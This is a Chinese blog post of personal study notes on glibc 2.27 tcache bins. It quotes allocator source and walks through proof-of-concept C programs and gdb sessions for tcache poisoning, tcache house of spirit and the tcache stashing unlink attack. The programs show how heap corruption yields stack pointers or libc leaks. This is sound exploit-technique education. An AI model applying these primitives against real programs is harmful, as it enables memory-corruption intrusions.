<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>关于如何理解Glibc堆管理器(Ⅶ——Tcache Bins!!) | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>关于如何理解Glibc堆管理器(Ⅶ——Tcache Bins!!)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-08-07T12:25:05.000Z" id="date"> 2021-08-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:34.995Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<p>本篇实为个人笔记，可能存在些许错误；若各位师傅发现哪里存在错误，还望指正。感激不尽。</p>
<p>若有图片及文稿引用，将在本篇结尾处著名来源(也有置于篇首的情况)。</p>
<p>        笔者本该将这一节的内容与第二节合并的，因为Tcache的并入并没有带来非常多的内容。但从结构上考虑，笔者一直以来都在使用glibc-2.23进行说明，在该版本下尚且没有引入Tcache Bins，因此这一节的内容一直拖欠到今。直到glibc-2.27开始，官方才引入了Tcache Bins结构，因此本节内容也将在该版本下进行说明(不过Ubuntu18确实用着比Ubuntu16来得舒服……)</p>
<p>        （注：读者不应以笔者给出的代码为准。笔者为了方便理解而将“在别处定义而在本函数中被使用的内容”一并展示在代码栏中，实际上，某些定义并非在该处被定义）</p>
<h2 id="Tcache-结构："><a href="#Tcache-结构：" class="headerlink" title="Tcache 结构："></a>Tcache 结构：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */<br># define TCACHE_MAX_BINS64<br> typedef struct tcache_entry<br> &#123;<br>   struct tcache_entry *next;<br>  /* This field exists to detect double frees.  */<br>  struct tcache_perthread_struct *key;<br> &#125; tcache_entry;<br>/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */<br>typedef struct tcache_perthread_struct<br>&#123;<br>  char counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br>static __thread tcache_perthread_struct *tcache = NULL;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/bb9bfb74-ea66-4faa-94bd-934cf8e76344'><img src="blob:https://tokameine.top/bb9bfb74-ea66-4faa-94bd-934cf8e76344"></p>
<p>         每个线程都有一个tcache_perthread_struct结构体，该结构体即为Tcache Bins的结构体</p>
<p>        可以注意到，每个线程最多只能有64个Tcache Bin，且用单项链表储存free chunk，这与Fast Bin是相同的，且它们储存chunk的大小也是严格分类，因此这一点上也相同</p>
<p>        (注：笔者试着翻阅了源代码，tcache_entry结构体中的*key直到glibc-2.29才出现，此前的版本均没有这一项。但笔者对照了自己Ubuntu18.04版本中正在使用的libc-2.27.so发现，该系统已经引入了这一结构，因此本节会按照存在该结构的环境进行介绍)</p>
<p>        （读者可在这里找到更新的commit：<a target="_blank" rel="noopener" href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7">sourceware.org Git - glibc.git&#x2F;blobdiff - malloc&#x2F;malloc.c</a>）</p>
<p>        而操作该结构体的函数主要有这两个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/* This is another arbitrary limit, which tunables can change.  Each<br>   tcache bin will hold at most this number of chunks.  */<br># define TCACHE_FILL_COUNT 7<br><br>static __always_inline void<br>tcache_put (mchunkptr chunk, size_t tc_idx)<br>&#123;<br>   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>   assert (tc_idx &lt; TCACHE_MAX_BINS);<br> <br>   /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will<br>      detect a double free.  */<br>   e-&gt;key = tcache;<br> <br>   e-&gt;next = tcache-&gt;entries[tc_idx];<br>   tcache-&gt;entries[tc_idx] = e;<br>   ++(tcache-&gt;counts[tc_idx]);<br> &#125;<br><br>/* Caller must ensure that we know tc_idx is valid and there&#x27;s<br>   available chunks to remove.  */<br>static __always_inline void *<br>tcache_get (size_t tc_idx)<br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; 0);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  return (void *) e;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/8257d854-c1e9-401d-9185-d42346c0f26f'><img src="blob:https://tokameine.top/8257d854-c1e9-401d-9185-d42346c0f26f"></p>
<p>        前者向Bins中放入chunk，后者则从中取出chunk。且每个Tcache Bin最多存放7个chunk(不过这段代码没能体现出来，该限制在malloc中存在，具体内容之后讲解)</p>
<ul>
<li>        chunk2mem 将返回chunk p的头部</li>
<li>        tc_idx 表示Tcache Bins的索引</li>
<li>        tcache-&gt;counts[tc_idx]指示索引为tc_idx的Bins中存放的chunk数</li>
</ul>
<p>        如下为Tcache Bins分配规则：(内容摘自CTF-WIKI)</p>
<p>内存申请：</p>
<p>在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中</p>
<ol>
<li>首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中</li>
<li>其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中</li>
<li>当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理</li>
</ol>
<ul>
<li>tcache 取出：在内存申请的开始部分，首先会判断申请大小块，并验证 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配</li>
<li>在循环处理 unsorted bin 内存块时，如果达到放入 unsorted bin 块最大数量，会立即返回。不过默认是 0，即不存在上限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#if USE_TCACHE<br>      /* If we&#x27;ve processed as many chunks as we&#x27;re allowed while<br>   filling the cache, return one of the cached ones.  */<br>      ++tcache_unsorted_count;<br>      if (return_cached<br>        &amp;&amp; mp_.tcache_unsorted_limit &gt; 0<br>        &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>      &#123;<br>        return tcache_get (tc_idx);<br>      &#125;<br>#endif<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/669d47f4-d423-4e24-a085-3d6fc762c401'><img src="blob:https://tokameine.top/669d47f4-d423-4e24-a085-3d6fc762c401"></p>
<p>        关于具体的代码实现，笔者打算将其留作最后几节的完结篇，因此这里不做代码分析，仅给出结论，并在之后的代码调试中验证结论</p>
<p>        实际上Tcache的内容就这么多，在理解了前三个Bins结构之后，笔者发现似乎已经没有其他可以讨论的内容了；但读者可能也发现了，对Tcache Bin进行操作的函数似乎非常简单，几乎没有做安全性检查，这也同样是事实，不过目前笔者还没有贴出完全的代码，因此整体还并不明朗，读者可以自行查阅相关资料，或是阅读笔者之后的几篇代码分析</p>
<p>        仅从结论来说，Tcache 确实不如最早的那三个来得安全(至少目前是这样)</p>
<h2 id="代码调试："><a href="#代码调试：" class="headerlink" title="代码调试："></a>代码调试：</h2><h3 id="tcache-poisoning：-删除了大多数说明"><a href="#tcache-poisoning：-删除了大多数说明" class="headerlink" title="tcache_poisoning：(删除了大多数说明)"></a>tcache_poisoning：(删除了大多数说明)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdint.h&gt;<br>#include &lt;assert.h&gt;<br><br>int main()<br>&#123;<br>size_t stack_var;<br>intptr_t *a = malloc(128);<br>intptr_t *b = malloc(128);<br>free(a);<br>free(b);<br>b[0] = (intptr_t)&amp;stack_var;<br>intptr_t *c = malloc(128);<br>intptr_t *d = malloc(128);<br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b405f02f-7a49-4423-88ea-152ca014b6e1'><img src="blob:https://tokameine.top/b405f02f-7a49-4423-88ea-152ca014b6e1"></p>
<p>        我们可以直接断点在第15行，此时的Bins结构为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ bins<br>tcachebins<br>0x90 [  2]: 0x5555557562f0 —▸ 0x555555756260 ◂— 0x0<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/229158e2-b3ee-4c17-bc98-21be335a2135'><img src="blob:https://tokameine.top/229158e2-b3ee-4c17-bc98-21be335a2135"></p>
<p>        (不过唯独Tcache Bins显示的地址是&amp;chunk+0x10) </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Free chunk (tcache)  PREV_INUSE<br>Addr: 0x555555756250<br>Size: 0x91<br>fd: 0x00<br><br>Free chunk (tcache)  PREV_INUSE<br>Addr: 0x5555557562e0<br>Size: 0x91<br>fd: 0x555555756260<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e2db21dd-38f1-42c9-a83f-3f369e99edb2'><img src="blob:https://tokameine.top/e2db21dd-38f1-42c9-a83f-3f369e99edb2"></p>
<p>        显然，此时chunk a与b均非放入Tcache Bins中，这也说明，其优先级甚至要高于Fast Bins</p>
<p>        再以chunk b为例，查看一下Tcache的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ x /6gx 0x5555557562e0<br>0x5555557562e0:0x00000000000000000x0000000000000091<br>0x5555557562f0:0x00005555557562600x0000555555756010<br>0x555555756300:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/45d68b51-9505-4152-99b8-0e8a1303fe15'><img src="blob:https://tokameine.top/45d68b51-9505-4152-99b8-0e8a1303fe15"></p>
<p>         它没有prev_size，但几乎和Fast Bin中的chunk是一样的，同时也不会合并，不会将Size中的P位标记置零，同时它们拥有共同的bk指针，这个指针有些特殊，它们会指向该线程的Tcache Bins表头，并被用作一个“key”，当对某个chunk进行free的时候便会遍历搜索，查看它是否已经被放入Tcache Bins，由此来防止出现Double Free的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Allocated chunk  PREV_INUSE<br>Addr: 0x555555756000<br>Size: 0x251<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e3bc5b64-397b-463e-89bc-684bee15673a'><img src="blob:https://tokameine.top/e3bc5b64-397b-463e-89bc-684bee15673a"></p>
<p>          继续往下，程序伪造了chunk b的fd指针，此时的Bins为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebins<br>0x90 [  2]: 0x5555557562f0 —▸ 0x7fffffffdeb8 ◂— 0x0<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/2d2406fe-7f5b-4d03-b8f6-396c398ec9d0'><img src="blob:https://tokameine.top/2d2406fe-7f5b-4d03-b8f6-396c398ec9d0"></p>
<p>         则在第二次申请时，将得到一个指向栈的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p d<br>$1 = (intptr_t *) 0x7fffffffdeb0<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/2e282da2-f8a2-4591-a881-c7abe822223e'><img src="blob:https://tokameine.top/2e282da2-f8a2-4591-a881-c7abe822223e"></p>
<h3 id="tcache-house-of-spirit："><a href="#tcache-house-of-spirit：" class="headerlink" title="tcache house of spirit："></a>tcache house of spirit：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;assert.h&gt;<br><br>int main()<br>&#123;<br>setbuf(stdout, NULL);<br>malloc(1);<br>unsigned long long *a; //pointer that will be overwritten<br>unsigned long long fake_chunks[10]; //fake chunk region<br>fake_chunks[1] = 0x40; // this is the size<br>a = &amp;fake_chunks[2];<br>free(a);<br>void *b = malloc(0x30);<br>assert((long)b == (long)&amp;fake_chunks[2]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/216c89ce-a79e-4d24-bc92-cb1b19155c6d'><img src="blob:https://tokameine.top/216c89ce-a79e-4d24-bc92-cb1b19155c6d"></p>
<p>         同样删除了几乎所有的注释</p>
<p>        直接运行到第8行</p>
<p>        首先申请一块内存来初始化堆结构，然后在栈上构造起fake_chunks结构，并以0x40作为该chunk的size</p>
<p>        此时如果对这个chunk进行free，那么这个伪造好的chunk就会被放进Bins中，并在接下来申请时候被返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebins<br>0x40 [  1]: 0x7fffffffde90 ◂— 0x0<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/f402c9f1-94cd-431f-9375-3238e77d39df'><img src="blob:https://tokameine.top/f402c9f1-94cd-431f-9375-3238e77d39df"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p b<br>$1 = (void *) 0x7fffffffde90<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7ccc4c6b-d4b4-4844-ba74-b178a2ca2639'><img src="blob:https://tokameine.top/7ccc4c6b-d4b4-4844-ba74-b178a2ca2639"></p>
<p>         由此可见，在glibc2.27版本中，对Tcache的合法性检查并不严谨，就连官方都曾表示：“在free之前需要确保该指针是安全的”(大致是这个意思)</p>
<h3 id="tcache-stashing-unlink-attack：-有稍微改动"><a href="#tcache-stashing-unlink-attack：-有稍微改动" class="headerlink" title="tcache_stashing_unlink_attack：(有稍微改动)"></a>tcache_stashing_unlink_attack：(有稍微改动)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;assert.h&gt;<br><br>int main()&#123;<br>    unsigned long stack_var[0x10] = &#123;0&#125;;<br>    unsigned long *chunk_lis[0x10] = &#123;0&#125;;<br>    unsigned long *target;<br><br>    setbuf(stdout, NULL);<br><br>    stack_var[3] = (unsigned long)(&amp;stack_var[2]);<br><br>    //now we malloc 9 chunks<br>    for(int i = 0;i &lt; 9;i++)&#123;<br>        chunk_lis[i] = (unsigned long*)malloc(0x90);<br>    &#125;<br><br>    //put 7 chunks into tcache<br>    for(int i = 3;i &lt; 9;i++)&#123;<br>        free(chunk_lis[i]);<br>    &#125;<br>    //last tcache bin<br>    free(chunk_lis[1]);<br><br>    //now they are put into unsorted bin<br>    free(chunk_lis[0]);<br>    free(chunk_lis[2]);<br>    //convert into small bin<br>    unsigned long *a=malloc(0xa0);// size &gt; 0x90<br>    //now 5 tcache bins<br>    unsigned long *b=malloc(0x90);<br>    unsigned long *c=malloc(0x90);<br>    //change victim-&gt;bck<br>    /*VULNERABILITY*/<br>    chunk_lis[2][1] = (unsigned long)stack_var;<br>    /*VULNERABILITY*/<br>    //trigger the attack<br>    unsigned long *d=calloc(1,0x90);<br>    //malloc and return our fake chunk on stack<br>    target = malloc(0x90);   <br>    assert(target == &amp;stack_var[2]);<br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/949945a6-2bef-43e9-8d81-9cae27c9d199'><img src="blob:https://tokameine.top/949945a6-2bef-43e9-8d81-9cae27c9d199"></p>
<p>        第一个断点于第26行，此时，程序开辟了9个相同大小的chunk，并free掉了后6个和第二个，剩下第一个和第三个</p>
<p>        此时，Tcache Bin已经装满，接下来的释放将把chunk 放入Unsorted Bin：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebins<br>0xa0 [  7]: 0x555555756300 —▸ 0x555555756760 —▸ 0x5555557566c0 —▸ 0x555555756620 —▸ 0x555555756580 —▸ 0x5555557564e0 —▸ 0x555555756440 ◂— 0x0<br>unsortedbin<br>all: 0x555555756390 —▸ 0x555555756250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555756390<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/3398e2e5-81b2-4111-b86a-004e45f994b2'><img src="blob:https://tokameine.top/3398e2e5-81b2-4111-b86a-004e45f994b2"></p>
<p>         接下来开辟chunk a，因为没有能够满足0xa0的free chunk，因此直接往下开辟新的chunk，且将Unsorted Bin中的内容放入Small Bin中</p>
<p>        然后开辟chunk b与c，由于Tcache Bin中有合适的，因此相继拿出第一个节点分配给它们</p>
<p>        接下来伪造chunk_lis[2]的bk指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ bins<br>tcachebins<br>0xa0 [  5]: 0x5555557566c0 —▸ 0x555555756620 —▸ 0x555555756580 —▸ 0x5555557564e0 —▸ 0x555555756440 ◂— 0x0<br>smallbins<br>0xa0 [corrupted]<br>FD: 0x555555756390 —▸ 0x555555756250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x555555756390<br>BK: 0x555555756250 —▸ 0x555555756390 —▸ 0x7fffffffddd0 —▸ 0x7fffffffdde0 ◂— 0x0<br>largebins<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/264a4233-5f80-40ec-bac8-f93d19d33e49'><img src="blob:https://tokameine.top/264a4233-5f80-40ec-bac8-f93d19d33e49"></p>
<p>        此时，如果程序调用calloc函数，则会触发一个特殊的机制：如果对应的Tcache Bin中仍有空余，则在分配给用户chunk之后，把Small Bin中其他的chunk放入Tcache Bin中，直到Tcache Bin放满，或者Small Bin放完</p>
<p>        其Unlink操作代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>     &amp;&amp; (tc_victim = last (bin)) != bin)<br>&#123;<br>  if (tc_victim != 0)<br>    &#123;<br>      bck = tc_victim-&gt;bk;<br>      set_inuse_bit_at_offset (tc_victim, nb);<br>      if (av != &amp;main_arena)<br>set_non_main_arena (tc_victim);<br>      bin-&gt;bk = bck;<br>      bck-&gt;fd = bin;<br><br>      tcache_put (tc_victim, tc_idx);<br>            &#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/67b58bf4-d0a3-4aeb-b841-59cdf5b2dbc4'><img src="blob:https://tokameine.top/67b58bf4-d0a3-4aeb-b841-59cdf5b2dbc4"></p>
<p>         由于存在bck-&gt;fd &#x3D; bin，因此，在本例中，当向Tcache Bin中放入Small Bin中放入 0x7fffffffddd0(即fake_chunk)后，将往0x7fffffffdde0-&gt;fd处写入bin的地址，由此造成libc地址泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebins<br>0xa0 [  7]: 0x7fffffffdde0 —▸ 0x5555557563a0 —▸ 0x5555557566c0 —▸ 0x555555756620 —▸ 0x555555756580 —▸ 0x5555557564e0 —▸ 0x555555756440 ◂— 0x0<br>smallbins<br>0xa0 [corrupted]<br>FD: 0x555555756390 —▸ 0x5555557566c0 ◂— 0x0<br>BK: 0x7fffffffdde0 ◂— 0x0<br><br>gdb-peda$ x /8gx 0x7fffffffddc0<br>0x7fffffffddc0:0x00005555557562600x00007ffff7dde39f<br>0x7fffffffddd0:0x00000000000000000x0000000000000000<br>0x7fffffffdde0:0x00005555557563a00x0000555555756010<br>0x7fffffffddf0:0x00007ffff7dcdd300x0000000000000000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/036b7bde-a22b-4713-876d-519b0c2c5e83'><img src="blob:https://tokameine.top/036b7bde-a22b-4713-876d-519b0c2c5e83"></p>
<p>         由于0x7fffffffddd0  的放入导致了Tcache Bin满员，所以0x7fffffffdde0被没放入Tcache Bin中，而其fd保留了bin的地址</p>
<p>        0x7fffffffddd0 被放入Tcache Bin中时，调用该函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcache_put (tc_victim, tc_idx);<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e93e746e-fdba-4247-9f2e-fb4cde3ad960'><img src="blob:https://tokameine.top/e93e746e-fdba-4247-9f2e-fb4cde3ad960"></p>
<p>         这个函数将0x7fffffffdde0-&gt;fd处的bin地址又用Tcache-&gt;fd的地址覆盖，因此没能在该chunk处泄露，倘若0x7fffffffdde0放入后，Tcache Bin仍未满员，那么0x7fffffffdde0也会被放入，则0x7fffffffdde0-&gt;fd中的bin地址也会被覆盖，因此，该利用必须严格控制Tcache Bin中的chunk数量</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>        先开辟9个相同大小的chunk，并且全都释放，使其中7个均被放入相同索引的Tcache Bin，而两个被放入Unsorted Bin中(这两个不应该在地址上相邻)</p>
<p>        通过请求更大的chunk，使得Unsorted Bin中的chunk被放入Small Bin中</p>
<p>        由于Small Bin按照FIFO(先进先出)使用，假设现在SmallBin-&gt;bk&#x3D;chunk0;chunk0-&gt;bk&#x3D;chunk1，为chunk1伪造一个fake_chunk，并将fake_chunk-&gt;bk指向一个可控的地址(指可写也可被获取内容)</p>
<p>        然后调用calloc函数，触发机制，将chunk0分配给用户，chunk1与chunk1-&gt;bk(即fake_chunk)被放入Tcache Bin中，且向fake_chunk-&gt;fd写入bin</p>
<p>        然后用户再次请求一个同样大小的chunk时，由于Tcache Bin遵守LIFO(先进后出)，因此将返回fake_chunk地址 ​</p>
<p>插画ID：91536470</p>
